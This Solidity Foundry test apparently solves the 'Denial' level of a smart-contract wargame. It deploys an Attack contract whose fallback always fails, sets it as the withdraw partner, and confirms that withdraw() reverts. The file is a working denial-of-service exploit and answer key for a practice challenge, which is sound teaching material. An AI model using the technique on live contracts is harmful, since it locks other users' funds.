// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/20_Denial.sol";

contract Attack{
    fallback() external payable {
        assert(false);
    }
}

contract DenialTest is Test {
    Denial _denial;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        _denial = new Denial();

        vm.deal(deployer, 0.001 ether);
        address(_denial).call{value: 0.001 ether}("");
    }

    function testSolution() public {
        vm.startPrank(attacker);

        Attack _attack = new Attack();
        _denial.setWithdrawPartner(address(_attack));

        assertTrue(address(_denial).balance > 100 wei, "Contract has been drained!");

        vm.expectRevert();
        address(_denial).call(abi.encodeWithSignature("withdraw()"));
    }
}
